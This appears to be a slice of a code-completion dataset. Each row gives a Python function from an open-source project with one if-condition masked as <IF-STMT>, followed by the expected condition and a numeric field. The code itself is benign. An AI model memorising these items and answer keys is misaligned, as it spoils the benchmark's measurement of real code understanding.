3405,"def _mul_matrix(self, other):<tab>if isinstance(other, ConstantDiagLazyTensor):<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Dimension Mismatch: Must have same diag_shape, but got ""<tab><tab><tab><tab>f""{self.diag_shape} and {other.diag_shape}""<tab><tab><tab>)<tab><tab>return self.__class__(<tab><tab><tab>self.diag_values * other.diag_values, diag_shape=self.diag_shape<tab><tab>)<tab>return super()._mul_matrix(other)",if not self . diag_shape == other . diag_shape :,141
3406,"def test_no_metadata_when_py_is_pep8(py_file):<tab>""""""This test assumes that all Python files in the jupytext folder follow PEP8 rules""""""<tab>nb = read(py_file)<tab>for i, cell in enumerate(nb.cells):<tab><tab><IF-STMT><tab><tab><tab>cell.metadata.pop(""title"")  # pragma: no cover<tab><tab>if i == 0 and not cell.source:<tab><tab><tab>assert cell.metadata == {""lines_to_next_cell"": 0}, py_file<tab><tab>else:<tab><tab><tab>assert not cell.metadata, (py_file, cell.source)","if ""title"" in cell . metadata :",155
3407,"def forward(self, x: Tensor, edge_index: Adj) -> Tensor:<tab>""""""""""""<tab>if self.add_self_loops:<tab><tab><IF-STMT><tab><tab><tab>edge_index, _ = remove_self_loops(edge_index)<tab><tab><tab>edge_index, _ = add_self_loops(edge_index, num_nodes=x.size(self.node_dim))<tab><tab>elif isinstance(edge_index, SparseTensor):<tab><tab><tab>edge_index = set_diag(edge_index)<tab>x_norm = F.normalize(x, p=2.0, dim=-1)<tab># propagate_type: (x: Tensor, x_norm: Tensor)<tab>return self.propagate(edge_index, x=x, x_norm=x_norm, size=None)","if isinstance ( edge_index , Tensor ) :",196
3408,"def should_wait(self, offer_hash: str):<tab>with self._lock:<tab><tab>if self._offer_hash is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>logger.debug(<tab><tab><tab><tab><tab>""already processing another offer (%s vs %s)"",<tab><tab><tab><tab><tab>self._offer_hash,<tab><tab><tab><tab><tab>offer_hash,<tab><tab><tab><tab>)<tab><tab><tab><tab>return True<tab><tab><tab>if self._started == self._wtct_num_subtasks:<tab><tab><tab><tab>logger.info(""all subtasks for `%s` have been started"", self._offer_hash)<tab><tab><tab><tab>return True<tab><tab>return False",if self . _offer_hash != offer_hash :,167
3409,"def _wrap_linespans(self, inner):<tab>s = self.linespans<tab>i = self.linenostart - 1<tab>for t, line in inner:<tab><tab><IF-STMT><tab><tab><tab>i += 1<tab><tab><tab>yield 1, '<span id=""%s-%d"">%s</span>' % (s, i, line)<tab><tab>else:<tab><tab><tab>yield 0, line",if t :,94
3410,"def onRemoteResponse(self, response, request_info):<tab>if isinstance(response, (dict,)):<tab><tab><IF-STMT><tab><tab><tab>msg = ""Celery echo: %s\nElapsed Time: %d""<tab><tab><tab>self.setText(msg % (response[""echo""], self.wait_cnt))<tab><tab>else:<tab><tab><tab>msg = ""Waiting for Celery (id, checkno): %s, %d""<tab><tab><tab>Label.setText(self, msg % (self.task_id, self.wait_cnt))<tab>else:<tab><tab>self.setText(""Could not get remote response as a dictionary"")","if ""echo"" in response :",151
3411,"def Visit_expr_stmt(self, node):  # pylint: disable=invalid-name<tab># expr_stmt ::= testlist_star_expr (augassign (yield_expr|testlist)<tab>#<tab><tab><tab>   | ('=' (yield_expr|testlist_star_expr))*)<tab>for child in node.children:<tab><tab>self.Visit(child)<tab><tab><IF-STMT><tab><tab><tab>_AppendTokenSubtype(child, format_token.Subtype.ASSIGN_OPERATOR)","if isinstance ( child , pytree . Leaf ) and child . value == ""="" :",136
3412,"def _list_outputs(self):<tab>outputs = self.output_spec().get()<tab>isHeader = True<tab>for key in self._outfields:<tab><tab>outputs[key] = []  # initialize outfields<tab>with open(self.inputs.in_file, ""r"") as fid:<tab><tab>for line in fid.readlines():<tab><tab><tab><IF-STMT>  # skip header line<tab><tab><tab><tab>isHeader = False<tab><tab><tab><tab>continue<tab><tab><tab>entry = self._parse_line(line)<tab><tab><tab>outputs = self._append_entry(outputs, entry)<tab>return outputs",if self . inputs . header and isHeader :,148
3413,"def _get_tables(self, schema):<tab>cursor = self._get_cursor()<tab>schemas = self.configuration.get(<tab><tab>""schemas"", self.configuration.get(""database"", """")<tab>).split("","")<tab>for schema_name in schemas:<tab><tab>cursor.columns(schema=schema_name)<tab><tab>for column in cursor:<tab><tab><tab>table_name = ""{}.{}"".format(column[1], column[2])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>schema[table_name] = {""name"": table_name, ""columns"": []}<tab><tab><tab>schema[table_name][""columns""].append(column[3])<tab>return list(schema.values())",if table_name not in schema :,162
3414,"def __setitem__(self, index, value):<tab>if self._physics.is_dirty and not self._triggers_dirty:<tab><tab>self._physics.forward()<tab>super(_SynchronizingArrayWrapper, self).__setitem__(index, value)<tab>if isinstance(self._backing_index, collections.Iterable):<tab><tab><IF-STMT><tab><tab><tab>resolved_index = (self._backing_index[index[0]],) + index[1:]<tab><tab>else:<tab><tab><tab>resolved_index = self._backing_index[index]<tab><tab>self._backing_array[resolved_index] = value<tab>if self._triggers_dirty:<tab><tab>self._physics.mark_as_dirty()","if isinstance ( index , tuple ) :",171
3415,"def fit_test_data(self, data, fit_values, imputer_value):<tab>for j in range(len(data)):<tab><tab>for i in range(len(data[j])):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data[j][i] = str(fit_values[i])<tab>return data",if data [ j ] [ i ] in imputer_value :,87
3416,"def Compare_in(t, x):<tab>if not isinstance(x.ops[0], (ast.NotIn, ast.In)):<tab><tab>return<tab>if t.enable_snippets:<tab><tab>from ..snippets import _in, in_es6<tab><tab>if t.enable_es6:<tab><tab><tab>t.add_snippet(in_es6)<tab><tab><tab>sname = ""in_es6""<tab><tab>else:<tab><tab><tab>t.add_snippet(_in)<tab><tab><tab>sname = ""_in""<tab><tab>result = JSCall(JSAttribute(""_pj"", sname), [x.left, x.comparators[0]])<tab><tab><IF-STMT><tab><tab><tab>result = JSUnaryOp(JSOpNot(), result)<tab><tab>return result","if isinstance ( x . ops [ 0 ] , ast . NotIn ) :",189
3417,"def __init__(self, f):<tab>self._refs = {}<tab>self._peeled = {}<tab>for line in f.readlines():<tab><tab>sha, name = line.rstrip(b""\n"").split(b""\t"")<tab><tab>if name.endswith(ANNOTATED_TAG_SUFFIX):<tab><tab><tab>name = name[:-3]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(""invalid ref name %r"" % name)<tab><tab><tab>self._peeled[name] = sha<tab><tab>else:<tab><tab><tab>if not check_ref_format(name):<tab><tab><tab><tab>raise ValueError(""invalid ref name %r"" % name)<tab><tab><tab>self._refs[name] = sha",if not check_ref_format ( name ) :,171
3418,"def info(args):<tab># Check grammar<tab>p = Python37Parser()<tab>if len(args) > 0:<tab><tab>arg = args[0]<tab><tab><IF-STMT><tab><tab><tab>from uncompyle6.parser.parse37 import Python37Parser<tab><tab><tab>p = Python37Parser()<tab><tab>elif arg == ""3.8"":<tab><tab><tab>from uncompyle6.parser.parse38 import Python38Parser<tab><tab><tab>p = Python38Parser()<tab><tab>else:<tab><tab><tab>raise RuntimeError(""Only 3.7 and 3.8 supported"")<tab>p.check_grammar()<tab>if len(sys.argv) > 1 and sys.argv[1] == ""dump"":<tab><tab>print(""-"" * 50)<tab><tab>p.dump_grammar()","if arg == ""3.7"" :",181
3419,"def test_ESPnetDataset_text_float(text_float):<tab>dataset = IterableESPnetDataset(<tab><tab>path_name_type_list=[(text_float, ""data8"", ""text_float"")],<tab><tab>preprocess=preprocess,<tab>)<tab>for key, data in dataset:<tab><tab>if key == ""a"":<tab><tab><tab>assert all((data[""data8""]) == np.array([1.4, 3.4], dtype=np.float32))<tab><tab><IF-STMT><tab><tab><tab>assert all((data[""data8""]) == np.array([0.9, 9.3], dtype=np.float32))","if key == ""b"" :",152
3420,"def getting(self, key, lock=False):<tab>if not lock:<tab><tab>yield self.get(key)<tab>else:<tab><tab>locked = False<tab><tab>try:<tab><tab><tab>data = self._get_or_lock(key)<tab><tab><tab>locked = data is None<tab><tab><tab>yield data<tab><tab>finally:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._release_lock(key)",if locked :,99
3421,"def mkdir(self, path, parents=True, raise_if_exists=False):<tab>if self.exists(path):<tab><tab><IF-STMT><tab><tab><tab>raise luigi.target.NotADirectory()<tab><tab>elif raise_if_exists:<tab><tab><tab>raise luigi.target.FileAlreadyExists()<tab><tab>else:<tab><tab><tab>return<tab>self.conn.files_create_folder_v2(path)",if not self . isdir ( path ) :,106
3422,"def _get_initiated_elections(cls, height, txns):<tab>elections = []<tab>for tx in txns:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elections.append(<tab><tab><tab>{""election_id"": tx.id, ""height"": height, ""is_concluded"": False}<tab><tab>)<tab>return elections","if not isinstance ( tx , Election ) :",93
3423,"def recalc_active(self, ts):<tab>if not self.active_seconds:<tab><tab>self.active_seconds.append(ts)<tab><tab>self.data[ts] = {}<tab>if ts not in self.active_seconds:<tab><tab><IF-STMT><tab><tab><tab>for i in range(max(self.active_seconds) + 1, ts + 1):<tab><tab><tab><tab>self.active_seconds.append(i)<tab><tab><tab><tab>self.active_seconds.sort()<tab><tab><tab><tab>self.data[i] = {}<tab>while len(self.active_seconds) > self.window:<tab><tab>self.active_seconds.pop(0)<tab>for sec in self.data.keys():<tab><tab>if sec not in self.active_seconds:<tab><tab><tab>self.data.pop(sec)",if ts > max ( self . active_seconds ) :,200
3424,"def get_scalar_base(schema, scalar) -> Tuple[str, ...]:<tab>base = base_type_name_map.get(scalar.id)<tab>if base is not None:<tab><tab>return base<tab>for ancestor in scalar.get_ancestors(schema).objects(schema):<tab><tab><IF-STMT><tab><tab><tab># Check if base is fundamental, if not, then it is<tab><tab><tab># another domain.<tab><tab><tab>try:<tab><tab><tab><tab>base = base_type_name_map[ancestor.id]<tab><tab><tab>except KeyError:<tab><tab><tab><tab>base = common.get_backend_name(schema, ancestor, catenate=False)<tab><tab><tab>return base<tab>raise ValueError(<tab><tab>f""cannot determine backend type for scalar type "" f""{scalar.get_name(schema)}""<tab>)",if not ancestor . get_is_abstract ( schema ) :,200
3425,def __next__(self):<tab>try:<tab><tab>value = next(self._iterable)<tab><tab><IF-STMT><tab><tab><tab>self.start()<tab><tab>else:<tab><tab><tab>self.update(self.value + 1)<tab><tab>return value<tab>except StopIteration:<tab><tab>self.finish()<tab><tab>raise<tab>except GeneratorExit:  # pragma: no cover<tab><tab>self.finish(dirty=True)<tab><tab>raise,if self . start_time is None :,109
3426,"def change_password(username=""flexget"", password="""", session=None):<tab>check = zxcvbn.zxcvbn(password, user_inputs=[username])<tab>if check[""score""] < 3:<tab><tab>warning = check[""feedback""][""warning""]<tab><tab>suggestions = "" "".join(check[""feedback""][""suggestions""])<tab><tab>message = ""Password '{}' is not strong enough. "".format(password)<tab><tab><IF-STMT><tab><tab><tab>message += warning + "" ""<tab><tab>if suggestions:<tab><tab><tab>message += ""Suggestions: {}"".format(suggestions)<tab><tab>raise WeakPassword(message)<tab>user = get_user(username=username, session=session)<tab>user.password = str(generate_password_hash(password))<tab>session.commit()",if warning :,175
3427,"def _options_fcheck(self, name, xflags, table):<tab>for entry in table:<tab><tab>if entry.name is None:<tab><tab><tab>break<tab><tab>if entry.flags & XTOPT_MAND and not xflags & (1 << entry.id):<tab><tab><tab>raise XTablesError(""%s: --%s must be specified"" % (name, entry.name))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue",if not xflags & ( 1 << entry . id ) :,112
3428,"def parse_ports(container_name, connection_configuration):<tab>while True:<tab><tab>ports_command = docker_util.build_docker_simple_command(<tab><tab><tab>""port"", container_name=container_name, **connection_configuration<tab><tab>)<tab><tab>with tempfile.TemporaryFile(prefix=""docker_port_"") as stdout_file:<tab><tab><tab>exit_code = subprocess.call(<tab><tab><tab><tab>ports_command, shell=True, stdout=stdout_file, preexec_fn=os.setpgrp<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>stdout_file.seek(0)<tab><tab><tab><tab>ports_raw = stdout_file.read().decode(""utf-8"")<tab><tab><tab><tab>return ports_raw",if exit_code == 0 :,180
3429,"def _init_ti_table():<tab>global _ti_table<tab>_ti_table = []<tab>for fname, name in zip(kc.STRFNAMES, kc.STRNAMES):<tab><tab>seq = termcap.get(name)<tab><tab>if not seq:<tab><tab><tab>continue<tab><tab>k = _name_to_key(fname)<tab><tab><IF-STMT><tab><tab><tab>_ti_table.append((list(bytearray(seq)), k))",if k :,109
3430,"def sanitize_args(a):<tab>try:<tab><tab>args, kwargs = a<tab><tab>if isinstance(args, tuple) and isinstance(kwargs, dict):<tab><tab><tab>return args, dict(kwargs)<tab>except (TypeError, ValueError):<tab><tab>args, kwargs = (), {}<tab>if a is not None:<tab><tab><IF-STMT><tab><tab><tab>args = tuple()<tab><tab><tab>kwargs = a<tab><tab>elif isinstance(a, tuple):<tab><tab><tab>if isinstance(a[-1], dict):<tab><tab><tab><tab>args, kwargs = a[0:-1], a[-1]<tab><tab><tab>else:<tab><tab><tab><tab>args = a<tab><tab><tab><tab>kwargs = {}<tab>return args, kwargs","if isinstance ( a , dict ) :",168
3431,"def fork_with_import_lock(level):<tab>release = 0<tab>in_child = False<tab>try:<tab><tab>try:<tab><tab><tab>for i in range(level):<tab><tab><tab><tab>imp.acquire_lock()<tab><tab><tab><tab>release += 1<tab><tab><tab>pid = os.fork()<tab><tab><tab>in_child = not pid<tab><tab>finally:<tab><tab><tab>for i in range(release):<tab><tab><tab><tab>imp.release_lock()<tab>except RuntimeError:<tab><tab>if in_child:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""RuntimeError in child"")<tab><tab><tab>os._exit(1)<tab><tab>raise<tab>if in_child:<tab><tab>os._exit(0)<tab>self.wait_impl(pid)",if verbose > 1 :,183
3432,"def _capture_hub(self, create):<tab># Subclasses should call this as the first action from any<tab># public method that could, in theory, block and switch<tab># to the hub. This may release the GIL.<tab>if self.hub is None:<tab><tab># This next line might release the GIL.<tab><tab>current_hub = get_hub() if create else get_hub_if_exists()<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab># We have the GIL again. Did anything change? If so,<tab><tab># we lost the race.<tab><tab>if self.hub is None:<tab><tab><tab>self.hub = current_hub",if current_hub is None :,161
3433,"def get_user_makepkg_path(cls) -> Optional[str]:<tab>if cls._user_makepkg_path == ""unset"":<tab><tab>possible_paths = [<tab><tab><tab>os.path.expanduser(""~/.makepkg.conf""),<tab><tab><tab>os.path.join(CONFIG_ROOT, ""pacman/makepkg.conf""),<tab><tab>]<tab><tab>config_path: Optional[str] = None<tab><tab>for path in possible_paths:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>config_path = path<tab><tab>cls._user_makepkg_path = config_path<tab>return cls._user_makepkg_path",if os . path . exists ( path ) :,154
3434,"def createValue(self):<tab>mode = []<tab>for name in self._text_keys:<tab><tab><IF-STMT><tab><tab><tab>if 4 <= len(mode):<tab><tab><tab><tab>mode.append(""..."")<tab><tab><tab><tab>break<tab><tab><tab>else:<tab><tab><tab><tab>mode.append(name)<tab>if mode:<tab><tab>return "", "".join(mode)<tab>else:<tab><tab>return ""(none)""",if self [ name ] . value :,102
3435,"def keyPressEvent(self, event):<tab>if event.key() in (Qt.Key_Right, Qt.Key_Left):<tab><tab>direction = 1<tab><tab>if event.key() == Qt.Key_Left:<tab><tab><tab>direction = -1<tab><tab><IF-STMT><tab><tab><tab>print(""shift"")<tab><tab><tab>direction *= 10<tab><tab>self.timeline.setValue(self.timeline.value() + direction)<tab>else:<tab><tab>super(VideoPlayerWidget, self).keyPressEvent(event)",if event . modifiers ( ) == Qt . ShiftModifier :,131
3436,"def validate_wrapper(*args, **kwargs):<tab>result = self.validate_func(*args, **kwargs)<tab>if request.is_xhr:<tab><tab><IF-STMT><tab><tab><tab>result = {}<tab><tab>result.setdefault(""success"", True)<tab><tab>values = result.get(""values"", {})<tab><tab>for key, value in tmpl_context.form_values.iteritems():<tab><tab><tab>values.setdefault(key, value)<tab>return result","if not isinstance ( result , dict ) :",110
3437,"def copy_metadata_to(self, target_dir):<tab>prefix = os.path.join(self.egg_info, """")<tab>for path in self.ei_cmd.filelist.files:<tab><tab><IF-STMT><tab><tab><tab>target = os.path.join(target_dir, path[len(prefix) :])<tab><tab><tab>ensure_directory(target)<tab><tab><tab>self.copy_file(path, target)",if path . startswith ( prefix ) :,103
3438,"def _get_switch_info(self, cmd_list):<tab>stdout, stderr, sw_data = None, None, None<tab>try:<tab><tab>stdout, stderr = self._run_ssh(cmd_list, True)<tab><tab>LOG.debug(""CLI output from ssh - output: %s"", stdout)<tab><tab><IF-STMT><tab><tab><tab>sw_data = stdout.splitlines()<tab><tab>return sw_data<tab>except processutils.ProcessExecutionError as e:<tab><tab>msg = _(<tab><tab><tab>""Error while getting data via ssh: (command=%(cmd)s "" ""error=%(err)s).""<tab><tab>) % {""cmd"": cmd_list, ""err"": six.text_type(e)}<tab><tab>LOG.error(msg)<tab><tab>raise exception.CiscoZoningCliException(reason=msg)",if stdout :,191
3439,"def analyze(vw):<tab>for va, dest in vw.findPointers():<tab><tab># Is there a location already at the target?<tab><tab>loc = vw.getLocation(dest)<tab><tab>if loc is None:<tab><tab><tab>continue<tab><tab>if loc[L_LTYPE] != LOC_IMPORT:<tab><tab><tab>continue<tab><tab>offset, bytes = vw.getByteDef(va)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if bytes[offset - 2 : offset] == b""\xff\x15"":  # call [importloc]<tab><tab><tab># If there's a pointer here, remove it.<tab><tab><tab>if vw.getLocation(va):<tab><tab><tab><tab>vw.delLocation(va)<tab><tab><tab>vw.makeCode(va - 2)",if offset < 2 :,192
3440,"def _freeze_stages(self):<tab>""""""Freeze parameters.""""""<tab>if self.frozen_stages >= 0:<tab><tab><IF-STMT><tab><tab><tab>self.stem.eval()<tab><tab><tab>for param in self.stem.parameters():<tab><tab><tab><tab>param.requires_grad = False<tab><tab>else:<tab><tab><tab>self.norm1.eval()<tab><tab><tab>for m in [self.conv1, self.norm1]:<tab><tab><tab><tab>for param in m.parameters():<tab><tab><tab><tab><tab>param.requires_grad = False<tab>for i in range(1, self.frozen_stages + 1):<tab><tab>m = getattr(self, f""layer{i}"")<tab><tab>m.eval()<tab><tab>for param in m.parameters():<tab><tab><tab>param.requires_grad = False",if self . deep_stem :,191
3441,"def seek(self, timestamp, log=True):<tab>""""""Seek to a particular timestamp in the movie.""""""<tab>if self.status in [PLAYING, PAUSED]:<tab><tab>player = self._player<tab><tab>if player and player.is_seekable():<tab><tab><tab>player.set_time(int(timestamp * 1000.0))<tab><tab><tab>self._vlc_clock.reset(timestamp)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._pause_time = timestamp<tab><tab>if log:<tab><tab><tab>logAttrib(self, log, ""seek"", timestamp)",if self . status == PAUSED :,137
3442,"def foundNestedPseudoClass(self):<tab>i = self.pos + 1<tab>openParen = 0<tab>while i < len(self.source_text):<tab><tab>ch = self.source_text[i]<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif ch == ""("":<tab><tab><tab># pseudoclasses can contain ()<tab><tab><tab>openParen += 1<tab><tab>elif ch == "")"":<tab><tab><tab>if openParen == 0:<tab><tab><tab><tab>return False<tab><tab><tab>openParen -= 1<tab><tab>elif ch == "";"" or ch == ""}"":<tab><tab><tab>return False<tab><tab>i += 1<tab>return False","if ch == ""{"" :",155
3443,"def update(events):<tab>if failsToWriteToIDClasses():<tab><tab>print(""Skip event: cannot write to ID classes"")<tab><tab>return<tab>if didNameChange() or events.intersection({""File"", ""Addon"", ""Tree""}):<tab><tab>updateEverything()<tab>if problems.canAutoExecute():<tab><tab>nodeTrees = list(iterAutoExecutionNodeTrees(events))<tab><tab><IF-STMT><tab><tab><tab>setupExecutionUnits()<tab><tab><tab>executeNodeTrees(nodeTrees)<tab><tab><tab>afterExecution()<tab><tab><tab>finishExecutionUnits()",if len ( nodeTrees ) > 0 :,136
3444,"def check_all_verified(self):<tab>if not self.all_verified:<tab><tab>new_all_verified = not self.lines.filter(verified=False).exists()<tab><tab><IF-STMT><tab><tab><tab>self.all_verified = True<tab><tab><tab>if self.require_verification:<tab><tab><tab><tab>self.add_log_entry(<tab><tab><tab><tab><tab>_(""All rows requiring verification have been verified."")<tab><tab><tab><tab>)<tab><tab><tab><tab>self.require_verification = False<tab><tab><tab>self.save()<tab>return self.all_verified",if new_all_verified :,136
3445,"def parse_for(cls, tagname, parser, bits, options):<tab>if bits:<tab><tab><IF-STMT><tab><tab><tab>bits.pop(0)<tab><tab><tab>if len(bits):<tab><tab><tab><tab>options[""for""] = Variable(bits.pop(0))<tab><tab><tab>else:<tab><tab><tab><tab>raise TemplateSyntaxError(<tab><tab><tab><tab><tab>""%s: expected an argument "" 'after ""for"".' % tagname<tab><tab><tab><tab>)<tab><tab>elif not cls.optional_for_parameter:<tab><tab><tab>raise TemplateSyntaxError(<tab><tab><tab><tab>""Unknown argument for %s tag: %r."" % (tagname, bits[0])<tab><tab><tab>)","if bits [ 0 ] == ""for"" :",161
3446,"def _get_cuda_device(*args):<tab># Returns cuda.Device or DummyDevice.<tab>for arg in args:<tab><tab><IF-STMT><tab><tab><tab>check_cuda_available()<tab><tab><tab>return Device(arg)<tab><tab>if isinstance(arg, ndarray):<tab><tab><tab>if arg.device is None:<tab><tab><tab><tab>continue<tab><tab><tab>return arg.device<tab><tab>if available and isinstance(arg, Device):<tab><tab><tab>return arg<tab># NOTE: This function returns DummyDevice for both NumPy and ChainerX<tab>return DummyDevice","if type ( arg ) is not bool and isinstance ( arg , _integer_types ) :",144
3447,"def while1_test(a, b, c):<tab>while 1:<tab><tab>if a != 2:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>a = 3<tab><tab><tab><tab>b = 0<tab><tab><tab>elif c:<tab><tab><tab><tab>c = 0<tab><tab><tab>else:<tab><tab><tab><tab>a += b + c<tab><tab><tab><tab>break<tab>return a, b, c",if b :,94
3448,"def write_notes(self, family, father, mother):<tab># FIXME:<tab># if self.restrict and self.exclnotes:<tab>#<tab>return<tab>self.write_note_of_person(father)<tab>self.write_note_of_person(mother)<tab>child_ref_list = family.get_child_ref_list()<tab>if child_ref_list:<tab><tab>for child_ref in child_ref_list:<tab><tab><tab>child = self.db.get_person_from_handle(child_ref.ref)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.write_note_of_person(child)",if child :,160
3449,"def GetFile(cls, session, sig, mode=""r""):<tab>sig = sig[: cls.HASH_LEN]<tab>while len(sig) > 0:<tab><tab>fn = cls.SaveFile(session, sig)<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return (open(fn, mode), sig)<tab><tab>except (IOError, OSError):<tab><tab><tab>pass<tab><tab>if len(sig) > 1:<tab><tab><tab>sig = sig[:-1]<tab><tab>else:<tab><tab><tab>if ""r"" in mode:<tab><tab><tab><tab>return (None, sig)<tab><tab><tab>else:<tab><tab><tab><tab>return (open(fn, mode), sig)<tab># Not reached<tab>return (None, None)",if os . path . exists ( fn ) :,180
3450,"def _generate_expression(self):<tab># turn my _format attribute into the _expression attribute<tab>e = []<tab>for part in PARSE_RE.split(self._format):<tab><tab>if not part:<tab><tab><tab>continue<tab><tab>elif part == ""{{"":<tab><tab><tab>e.append(r""\{"")<tab><tab>elif part == ""}}"":<tab><tab><tab>e.append(r""\}"")<tab><tab><IF-STMT><tab><tab><tab># this will be a braces-delimited field to handle<tab><tab><tab>e.append(self._handle_field(part))<tab><tab>else:<tab><tab><tab># just some text to match<tab><tab><tab>e.append(REGEX_SAFETY.sub(self._regex_replace, part))<tab>return """".join(e)","elif part [ 0 ] == ""{"" and part [ - 1 ] == ""}"" :",189
3451,"def get_cfg_dict(self, with_meta=True):<tab>options_dict = self.merged_options<tab>if with_meta:<tab><tab><IF-STMT><tab><tab><tab>options_dict.update(<tab><tab><tab><tab>{""package"": ""yandextank.plugins.{}"".format(self.plugin)}<tab><tab><tab>)<tab><tab>if self.enabled is not None:<tab><tab><tab>options_dict.update({""enabled"": self.enabled})<tab>return options_dict",if self . plugin :,111
3452,"def __str__(self):<tab>_outicalfile = self._icalfile<tab>for unit in self.units:<tab><tab>for location in unit.getlocations():<tab><tab><tab>match = re.match(""\\[(?P<uid>.+)\\](?P<property>.+)"", location)<tab><tab><tab>for component in self._icalfile.components():<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>if component.uid.value != match.groupdict()[""uid""]:<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>for property in component.getChildren():<tab><tab><tab><tab><tab>if property.name == match.groupdict()[""property""]:<tab><tab><tab><tab><tab><tab>property.value = unit.target<tab>if _outicalfile:<tab><tab>return str(_outicalfile.serialize())<tab>else:<tab><tab>return """"","if component . name != ""VEVENT"" :",198
3453,"def process_events(self, events):<tab>for event in events:<tab><tab>key = (event.ident, event.filter)<tab><tab>if event.ident == self._force_wakeup_fd:<tab><tab><tab>self._force_wakeup.drain()<tab><tab><tab>continue<tab><tab>receiver = self._registered[key]<tab><tab><IF-STMT><tab><tab><tab>del self._registered[key]<tab><tab>if type(receiver) is _core.Task:<tab><tab><tab>_core.reschedule(receiver, outcome.Value(event))<tab><tab>else:<tab><tab><tab>receiver.put_nowait(event)",if event . flags & select . KQ_EV_ONESHOT :,154
3454,"def forward(self, start=True, search=False, target=None, include_current=False):<tab>""""""Move one step forward in the history.""""""<tab>if target is None:<tab><tab>target = self.saved_line<tab>if self.index > 1:<tab><tab><IF-STMT><tab><tab><tab>self.index -= self.find_partial_match_forward(target, include_current)<tab><tab>elif start:<tab><tab><tab>self.index -= self.find_match_forward(target, include_current)<tab><tab>else:<tab><tab><tab>self.index -= 1<tab><tab>return self.entry<tab>else:<tab><tab>self.index = 0<tab><tab>return self.saved_line",if search :,161
3455,"def _charlabels(self, options):<tab>""""""Get labels for characters (PRIVATE).""""""<tab>self.charlabels = {}<tab>opts = CharBuffer(options)<tab>while True:<tab><tab># get id and state<tab><tab>w = opts.next_word()<tab><tab>if w is None:  # McClade saves and reads charlabel-lists with terminal comma?!<tab><tab><tab>break<tab><tab>identifier = self._resolve(w, set_type=CHARSET)<tab><tab>state = quotestrip(opts.next_word())<tab><tab>self.charlabels[identifier] = state<tab><tab># check for comma or end of command<tab><tab>c = opts.next_nonwhitespace()<tab><tab>if c is None:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>raise NexusError(""Missing ',' in line %s."" % options)","elif c != "","" :",198
3456,"def _get_cloudstorage_bucket_iam_member_bindings(self, raw_bucket):<tab>bucket_iam_policy = raw_bucket.iam_policy<tab>member_bindings = {}<tab>if bucket_iam_policy:<tab><tab>for binding in bucket_iam_policy._bindings:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for member in binding[""members""]:<tab><tab><tab><tab><tab>if member not in member_bindings:<tab><tab><tab><tab><tab><tab>member_bindings[member] = [binding[""role""]]<tab><tab><tab><tab><tab>else:<tab><tab><tab><tab><tab><tab>member_bindings[member].append(binding[""role""])<tab>return member_bindings","if ""legacy"" not in binding [ ""role"" ] :",159
3457,"def _gen():<tab>for i in dataset():<tab><tab>if isinstance(i, tuple) or isinstance(i, list):<tab><tab><tab>if fn(*i) is True:<tab><tab><tab><tab>yield i<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield i",if fn ( i ) is True :,72
3458,"def set_img_to_eval_imgs(self, scores, img_ids, method):<tab>for img_id, score in zip(img_ids, scores):<tab><tab><IF-STMT><tab><tab><tab>self.img_to_eval[img_id] = dict()<tab><tab><tab>self.img_to_eval[img_id][""image_id""] = img_id<tab><tab>self.img_to_eval[img_id][method] = score",if img_id not in self . img_to_eval :,118
3459,"def _compute_totals(self):<tab>totals = {}<tab>for entry in self.entries:<tab><tab>for k, v in entry.nutrition_information.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>totals[k] = v<tab><tab><tab>else:<tab><tab><tab><tab>totals[k] += v<tab>self._totals = totals",if k not in totals :,87
3460,"def analyzeFunction(vw, funcva):<tab>for fromva, tova, rtype, rflags in vw.getXrefsFrom(funcva, v_const.REF_CODE):<tab><tab># You goin NOWHERE!<tab><tab>loc = vw.getLocation(tova)<tab><tab>if loc is None:<tab><tab><tab>continue<tab><tab># FIXME this could check for thunks to other known function pointers...<tab><tab>va, size, ltype, linfo = loc<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>vw.makeFunctionThunk(funcva, linfo)",if ltype != v_const . LOC_IMPORT :,148
3461,"def clear_output_directory(self):<tab>files = os.listdir(os.path.join(""functional"", ""output""))<tab>for f in files:<tab><tab><IF-STMT><tab><tab><tab>continue  # don't touch the infrastructure<tab><tab>path = os.path.join(""functional"", ""output"", f)<tab><tab>if os.path.isdir(path):<tab><tab><tab>shutil.rmtree(path)<tab><tab>else:<tab><tab><tab>os.remove(path)","if f in ( ""README.txt"" , "".svn"" , ""CVS"" ) :",121
3462,"def test_output_files_as_none_string(self):<tab>for name in ""Output"", ""Report"", ""Log"", ""XUnit"", ""DebugFile"":<tab><tab>attr = (name[:-4] if name.endswith(""File"") else name).lower()<tab><tab>settings = RobotSettings({name.lower(): ""NoNe""})<tab><tab>assert_equals(settings[name], None)<tab><tab><IF-STMT><tab><tab><tab>assert_equals(getattr(settings, attr), None)","if hasattr ( settings , attr ) :",117
